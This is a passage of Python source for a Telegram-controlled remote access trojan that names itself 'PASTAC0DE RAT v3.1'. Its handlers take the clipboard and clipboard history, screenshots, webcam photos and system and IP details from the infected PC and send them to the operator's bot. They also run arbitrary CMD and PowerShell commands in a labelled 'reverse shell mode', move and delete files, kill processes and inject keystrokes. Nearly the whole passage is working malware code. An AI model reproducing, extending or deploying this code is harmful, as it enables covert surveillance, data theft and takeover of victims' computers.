            try:
                text = pyperclip.paste()
                bot.send_message(chat_id, "<b>Clipboard:</b>\n\n<code>%s</code>" % text[:3000], reply_markup=clipboard_menu())
            except Exception as e:
                bot.send_message(chat_id, "Error: " + str(e), reply_markup=clipboard_menu())
        else:
            bot.send_message(chat_id, "pyperclip not installed!", reply_markup=clipboard_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "clipboard_history":
        log_action(message, "CLIPBOARD_HISTORY", "Requested")
        if clipboard_history:
            text = "<b>Clipboard History</b>\n\n" + "\n---\n".join(clipboard_history[-10:])
        else:
            text = "<b>No clipboard history</b>"
        bot.send_message(chat_id, text[:3500], reply_markup=clipboard_menu())
        bot.answer_callback_query(call.id)
        return

    # Screenshot
    if data == "screenshot":
        log_action(message, "SCREENSHOT", "Requested")
        bot.answer_callback_query(call.id, "Taking screenshot...")
        if not PIL_OK:
            bot.send_message(chat_id, "Pillow not installed!", reply_markup=main_menu())
            return
        try:
            img = ImageGrab.grab()
            tmp = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
            img.save(tmp.name, "PNG")
            tmp.close()
            with open(tmp.name, "rb") as f:
                bot.send_photo(chat_id, f, caption="Screen from %s" % PC_FULL_NAME, reply_markup=main_menu())
            os.unlink(tmp.name)
            log_action(message, "SCREENSHOT_DONE", "Success")
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e), reply_markup=main_menu())
            log_action(message, "SCREENSHOT_ERROR", str(e))
        return

    # Webcam
    if data == "photo":
        log_action(message, "WEBCAM", "Requested")
        bot.answer_callback_query(call.id, "Taking photo...")
        if not CV2_OK:
            bot.send_message(chat_id, "OpenCV not installed!", reply_markup=main_menu())
            return
        try:
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if not cap.isOpened():
                for idx in [1, 2]:
                    cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
                    if cap.isOpened():
                        break
            if not cap.isOpened():
                bot.send_message(chat_id, "Webcam not found", reply_markup=main_menu())
                return
            ret, frame = cap.read()
            cap.release()
            if not ret:
                bot.send_message(chat_id, "Failed to capture", reply_markup=main_menu())
                return
            tmp = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
            cv2.imwrite(tmp.name, frame)
            with open(tmp.name, "rb") as f:
                bot.send_photo(chat_id, f, caption="Webcam from %s" % PC_FULL_NAME, reply_markup=main_menu())
            os.unlink(tmp.name)
            log_action(message, "WEBCAM_DONE", "Success")
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e), reply_markup=main_menu())
            log_action(message, "WEBCAM_ERROR", str(e))
        return

    # PC Info
    if data == "pc_info":
        log_action(message, "PC_INFO", "Requested")
        pc = get_pc_info()
        info_text = (
            "<b>PC: %s</b>\n"
            "ID: <code>%s</code>\n\n"
            "System: %s\n"
            "User: <code>%s</code>\n"
            "OS: %s\n"
            "CPU: %s cores, %s\n"
            "RAM: %s / %s (%s)\n"
            "Local IP: <code>%s</code>\n"
            "Public IP: <code>%s</code>\n"
            "Boot: %s\n"
            "Disks: %s"
        ) % (
            PC_FULL_NAME, PC_ID,
            pc.get("hostname", "N/A"), pc.get("username", "N/A"), pc.get("platform", "N/A"),
            pc.get("cpu_count", "N/A"), pc.get("cpu_freq", "N/A"),
            pc.get("ram_used", "N/A"), pc.get("ram_total", "N/A"), pc.get("ram_percent", "N/A"),
            pc.get("local_ip", "N/A"), pc.get("public_ip", "N/A"),
            pc.get("boot_time", "N/A"), pc.get("disks", "N/A")
        )
        bot.send_message(chat_id, info_text, reply_markup=main_menu())
        log_action(message, "PC_INFO_DONE", "Sent")
        bot.answer_callback_query(call.id)
        return

    # My PCs
    if data == "my_pcs":
        log_action(message, "MY_PCS", "Requested")
        pc = get_pc_info()
        text = (
            "<b>This PC</b>\n"
            "Name: <code>%s</code>\n"
            "ID: <code>%s</code>\n"
            "User: <code>%s</code>\n"
            "IP: <code>%s</code> / <code>%s</code>\n"
            "Status: Online"
        ) % (PC_FULL_NAME, PC_ID, pc.get("username", "N/A"), pc.get("local_ip", "N/A"), pc.get("public_ip", "N/A"))
        if supabase:
            try:
                result = supabase.table("pc_keys").select("*").eq("is_active", True).execute()
                if result.data:
                    text += "\n\n<b>All PCs:</b>\n"
                    for p in result.data:
                        status = "Active" if p.get("is_active") else "Inactive"
                        text += "- %s (%s)\n" % (p.get("pc_name", "Unknown"), status)
            except:
                pass
        bot.send_message(chat_id, text, reply_markup=main_menu())
        bot.answer_callback_query(call.id)
        return

    # Hotkeys
    if data.startswith("hotkey_"):
        key_combo = data.replace("hotkey_", "")
        key_map = {
            "win_r": ["win", "r"], "alt_f4": ["alt", "f4"],
            "ctrl_shift_esc": ["ctrl", "shift", "esc"],
            "enter": ["enter"], "tab": ["tab"], "esc": ["esc"],
            "space": ["space"], "win_d": ["win", "d"],
            "ctrl_c": ["ctrl", "c"], "ctrl_v": ["ctrl", "v"],
            "ctrl_a": ["ctrl", "a"], "ctrl_z": ["ctrl", "z"],
            "win_l": ["win", "l"], "win_e": ["win", "e"],
        }
        keys = key_map.get(key_combo, [key_combo])
        log_action(message, "HOTKEY", "+".join(keys))
        if not PYAUTO_OK:
            bot.answer_callback_query(call.id, "pyautogui not installed!")
            return
        try:
            pyautogui.hotkey(*keys)
            bot.answer_callback_query(call.id, "Pressed: " + "+".join(keys))
        except Exception as e:
            bot.answer_callback_query(call.id, "Error: " + str(e))
        return

    # Prompts
    if data.endswith("_prompt"):
        prompts = {
            "cmd_prompt": ("Enter CMD command:\nExample: dir /s", "CMD"),
            "powershell_prompt": ("Enter PowerShell command:", "PS"),
            "mkdir_prompt": ("Enter folder name:", "MKDIR"),
            "touch_prompt": ("Enter file name:", "TOUCH"),
            "del_prompt": ("Enter file/folder to delete:", "DEL"),
            "zip_prompt": ("Enter folder to zip:", "ZIP"),
            "unzip_prompt": ("Enter zip file:", "UNZIP"),
            "download_prompt": ("Enter file path:", "DOWNLOAD"),
            "upload_prompt": ("Send me a file to upload to current dir", "UPLOAD"),
            "search_prompt": ("Enter search pattern:\nExample: *.txt", "SEARCH"),
            "run_prompt": ("Enter app path:\nExample: notepad.exe", "RUN"),
            "kill_prompt": ("Enter process name:\nExample: chrome.exe", "KILL"),
            "killpid_prompt": ("Enter PID:", "KILLPID"),
            "type_prompt": ("Enter text to type:", "TYPE"),
            "hotkey_custom_prompt": ("Enter combo:\nExample: win+r", "HOTKEY_CUSTOM"),
            "clipboard_set_prompt": ("Enter text to set clipboard:", "CLIPBOARD_SET"),
            "audio_record_prompt": ("Enter duration (seconds):", "AUDIO_RECORD"),
            "screen_record_prompt": ("Enter duration (seconds):", "SCREEN_RECORD"),
            "shell_prompt": ("Enter shell command (reverse shell mode):", "SHELL"),
        }
        if data in prompts:
            text, action_type = prompts[data]
            log_action(message, "PROMPT_" + action_type, "Requested")
            user_states[chat_id] = {"action": action_type}
            bot.send_message(chat_id, text)
            bot.answer_callback_query(call.id)
        return

    bot.answer_callback_query(call.id, "Unknown")

# ============ TEXT INPUT ============
@bot.message_handler(func=lambda m: m.chat.id in user_states)
def handle_text_input(message):
    chat_id = message.chat.id
    state = user_states.pop(chat_id, {})
    action = state.get("action", "UNKNOWN")
    text = message.text.strip()

    if action == "ENTER_KEY":
        key_input = text.upper()
        if verify_key(chat_id, key_input):
            bot.reply_to(message, "Access granted!", reply_markup=main_menu())
            log_action(message, "AUTH_SUCCESS", "Key accepted")
        else:
            bot.reply_to(message, "Invalid key. Try /key YOUR_KEY")
            log_action(message, "AUTH_FAILED", "Key rejected: " + key_input)
        return

    if not is_auth(chat_id):
        bot.reply_to(message, "Access denied. Use /start")
        return

    global CURRENT_DIR

    if action == "CMD":
        log_action(message, "/cmd", text)
        bot.reply_to(message, "Executing: <code>%s</code>..." % text)
        try:
            result = subprocess.run(text, shell=True, capture_output=True, text=True,
                                   encoding="utf-8", errors="replace", cwd=CURRENT_DIR, timeout=60)
            output = ""
            if result.stdout:
                output += "<b>stdout:</b>\n<pre>%s</pre>\n\n" % result.stdout[:3000]
            if result.stderr:
                output += "<b>stderr:</b>\n<pre>%s</pre>\n\n" % result.stderr[:3000]
            output += "<b>exit:</b> %d" % result.returncode
            if len(output) > 4000:
                output = output[:4000] + "\n... (truncated)"
            bot.reply_to(message, output, reply_markup=system_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=system_menu())

    elif action == "PS":
        log_action(message, "/powershell", text)
        bot.reply_to(message, "Executing PowerShell: <code>%s</code>..." % text)
        try:
            result = subprocess.run(["powershell", "-Command", text], shell=True, capture_output=True, text=True,
                                   encoding="utf-8", errors="replace", cwd=CURRENT_DIR, timeout=60)
            output = ""
            if result.stdout:
                output += "<b>stdout:</b>\n<pre>%s</pre>\n\n" % result.stdout[:3000]
            if result.stderr:
                output += "<b>stderr:</b>\n<pre>%s</pre>\n\n" % result.stderr[:3000]
            output += "<b>exit:</b> %d" % result.returncode
            if len(output) > 4000:
                output = output[:4000] + "\n... (truncated)"
            bot.reply_to(message, output, reply_markup=system_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=system_menu())

    elif action == "SHELL":
        log_action(message, "/shell", text)
        bot.reply_to(message, "Executing shell: <code>%s</code>..." % text)
        try:
            result = subprocess.run(text, shell=True, capture_output=True, text=True,
                                   encoding="utf-8", errors="replace", cwd=CURRENT_DIR, timeout=60)
            output = "<b>Shell Output:</b>\n<pre>%s</pre>" % result.stdout[:3500]
            if result.stderr:
                output += "\n<b>Errors:</b>\n<pre>%s</pre>" % result.stderr[:1500]
            bot.reply_to(message, output, reply_markup=advanced_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=advanced_menu())

    elif action == "MKDIR":
        log_action(message, "/mkdir", text)
        try:
            new_dir = CURRENT_DIR / text
            new_dir.mkdir(parents=True, exist_ok=True)
            bot.reply_to(message, "Created: <code>%s</code>" % new_dir, reply_markup=files_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=files_menu())

    elif action == "TOUCH":
        log_action(message, "/touch", text)
        try:
            filepath = CURRENT_DIR / text
            filepath.touch(exist_ok=True)
            bot.reply_to(message, "Created: <code>%s</code>" % filepath, reply_markup=files_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=files_menu())

    elif action == "DEL":
        log_action(message, "/del", text)
        try:
            target = CURRENT_DIR / text
            if not target.exists():
                bot.reply_to(message, "Not found", reply_markup=files_menu())
                return
            if target.is_dir():
                shutil.rmtree(target)
                bot.reply_to(message, "Deleted folder: <code>%s</code>" % target, reply_markup=files_menu())
            else:
                target.unlink()
                bot.reply_to(message, "Deleted file: <code>%s</code>" % target, reply_markup=files_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=files_menu())

    elif action == "ZIP":
        log_action(message, "/zip", text)
        try:
            source = CURRENT_DIR / text
            if not source.exists() or not source.is_dir():
                bot.reply_to(message, "Folder not found", reply_markup=files_menu())
                return
            zip_path = CURRENT_DIR / (text + ".zip")
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for file_path in source.rglob("*"):
                    arcname = file_path.relative_to(source)
                    zf.write(file_path, arcname)
            bot.reply_to(message, "Created: <code>%s</code>" % zip_path.name, reply_markup=files_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=files_menu())

    elif action == "UNZIP":
        log_action(message, "/unzip", text)
        try:
            archive = CURRENT_DIR / text
            if not archive.exists():
                bot.reply_to(message, "Not found", reply_markup=files_menu())
                return
            extract_to = CURRENT_DIR / text.replace(".zip", "")
            extract_to.mkdir(exist_ok=True)
            with zipfile.ZipFile(archive, "r") as zf:
                zf.extractall(extract_to)
            bot.reply_to(message, "Extracted: <code>%s</code>" % extract_to, reply_markup=files_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=files_menu())

    elif action == "DOWNLOAD":
        log_action(message, "/download", text)
        try:
            filepath = CURRENT_DIR / text
            if not filepath.exists():
                bot.reply_to(message, "Not found", reply_markup=files_menu())
                return
            if filepath.stat().st_size > 50 * 1024 * 1024:
                bot.reply_to(message, "Too big (>50 MB)", reply_markup=files_menu())
                return
            with open(filepath, "rb") as f:
                bot.send_document(chat_id, f, caption=filepath.name, reply_markup=files_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=files_menu())

    elif action == "SEARCH":
        log_action(message, "/search", text)
        try:
            matches = []
            for item in CURRENT_DIR.rglob(text):
                matches.append(str(item))
            if matches:
                result = "<b>Search results:</b>\n\n" + "\n".join(matches[:50])
            else:
                result = "<b>No matches found</b>"
            bot.reply_to(message, result[:4000], reply_markup=files_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=files_menu())

    elif action == "RUN":
        log_action(message, "/run", text)
        try:
            target = pathlib.Path(text)
            if not target.is_absolute():
                target = CURRENT_DIR / target
            subprocess.Popen([str(target)], shell=True, cwd=str(CURRENT_DIR))
            bot.reply_to(message, "Started: <code>%s</code>" % target, reply_markup=processes_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=processes_menu())

    elif action == "KILL":
        log_action(message, "/kill", text)
        if not PSUTIL_OK:
            bot.reply_to(message, "psutil not installed!", reply_markup=processes_menu())
            return
        try:
            killed = []
            for proc in psutil.process_iter(["pid", "name"]):
                if proc.info["name"] and text.lower() in proc.info["name"].lower():
                    p = psutil.Process(proc.info["pid"])
                    p.terminate()
                    killed.append(proc.info["name"])
            if killed:
                bot.reply_to(message, "Killed: " + ", ".join(killed), reply_markup=processes_menu())
            else:
                bot.reply_to(message, "Not found: " + text, reply_markup=processes_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=processes_menu())

    elif action == "KILLPID":
        log_action(message, "/killpid", text)
        if not PSUTIL_OK:
            bot.reply_to(message, "psutil not installed!", reply_markup=processes_menu())
            return
        try:
            pid = int(text)
            p = psutil.Process(pid)
            name = p.name()
            p.terminate()
            bot.reply_to(message, "Killed %s (PID: %d)" % (name, pid), reply_markup=processes_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=processes_menu())

    elif action == "TYPE":
        log_action(message, "/type", text)
        if not PYAUTO_OK:
            bot.reply_to(message, "pyautogui not installed!", reply_markup=keyboard_menu())
            return
        try:
            pyautogui.typewrite(text, interval=0.01)
            bot.reply_to(message, "Typed: <code>%s</code>" % text[:50], reply_markup=keyboard_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=keyboard_menu())

    elif action == "HOTKEY_CUSTOM":
        log_action(message, "/hotkey_custom", text)
        if not PYAUTO_OK:
            bot.reply_to(message, "pyautogui not installed!", reply_markup=keyboard_menu())
            return
        try:
            keys_raw = text.lower().split("+")
            key_map = {
                "win": "win", "windows": "win", "ctrl": "ctrl", "control": "ctrl",
                "alt": "alt", "shift": "shift", "tab": "tab", "enter": "enter",
                "esc": "esc", "escape": "esc", "space": "space", "delete": "delete",
                "del": "delete", "backspace": "backspace", "up": "up", "down": "down",
                "left": "left", "right": "right",
            }
            keys = [key_map.get(k.strip(), k.strip()) for k in keys_raw]
            pyautogui.hotkey(*keys)
            bot.reply_to(message, "Pressed: <code>%s</code>" % "+".join(keys), reply_markup=keyboard_menu())
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=keyboard_menu())

    elif action == "CLIPBOARD_SET":
        log_action(message, "/clipboard_set", text)
        if CLIPBOARD_OK:
            try:
                pyperclip.copy(text)
                clipboard_history.append(text[:200])
                bot.reply_to(message, "Clipboard set to: <code>%s</code>" % text[:100], reply_markup=clipboard_menu())
            except Exception as e:
                bot.reply_to(message, "Error: " + str(e), reply_markup=clipboard_menu())
        else:
            bot.reply_to(message, "pyperclip not installed!", reply_markup=clipboard_menu())

    elif action == "AUDIO_RECORD":
        log_action(message, "/audio_record", text)
        bot.reply_to(message, "Audio recording requires sounddevice library.\nInstall: pip install sounddevice soundfile", reply_markup=advanced_menu())

    elif action == "SCREEN_RECORD":
        log_action(message, "/screen_record", text)
        bot.reply_to(message, "Screen recording requires numpy.\nInstall: pip install numpy", reply_markup=advanced_menu())

    else:
        bot.reply_to(message, "Unknown action", reply_markup=main_menu())

# ============ FILE UPLOAD ============
@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    if not is_auth(chat_id):
        bot.reply_to(message, "Access denied.")
        return

    state = user_states.get(chat_id, {})
    if state.get("action") == "UPLOAD":
        log_action(message, "UPLOAD", message.document.file_name)
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            filepath = CURRENT_DIR / message.document.file_name
            with open(filepath, "wb") as f:
                f.write(downloaded)
            bot.reply_to(message, "Uploaded: <code>%s</code>" % filepath, reply_markup=files_menu())
            user_states.pop(chat_id, None)
        except Exception as e:
            bot.reply_to(message, "Error: " + str(e), reply_markup=files_menu())
    else:
        bot.reply_to(message, "Use 'Upload' button first", reply_markup=files_menu())

# ============ UNKNOWN ============
@bot.message_handler(func=lambda m: True)
def unknown(message):
    chat_id = message.chat.id
    if not is_auth(chat_id):
        bot.reply_to(message, "Access denied. Use /start")
        return
    log_action(message, "UNKNOWN", str(message.text)[:100])
    bot.reply_to(message, "Use buttons or /start", reply_markup=main_menu())

# ============ START ============
if __name__ == "__main__":
    logger.info("=" * 50)
    logger.info("PASTAC0DE RAT v3.1 started")
    logger.info("PC: %s (ID: %s)" % (PC_FULL_NAME, PC_ID))
    logger.info("Access Key: %s" % ACCESS_KEY)
    logger.info("Supabase: %s" % ("Connected" if supabase else "Offline"))
    logger.info("Log file: %s" % log_file)
    logger.info("=" * 50)

    try:
        bot.delete_webhook(drop_pending_updates=True)
        time.sleep(2)
    except:
        pass

    try:
        bot.polling(none_stop=True, interval=0, timeout=10)
    except Exception as e:
        logger.error("Bot crashed: %s" % e)
        time.sleep(5)
        logger.info("Restarting...")
        bot.polling(none_stop=True, interval=0, timeout=10)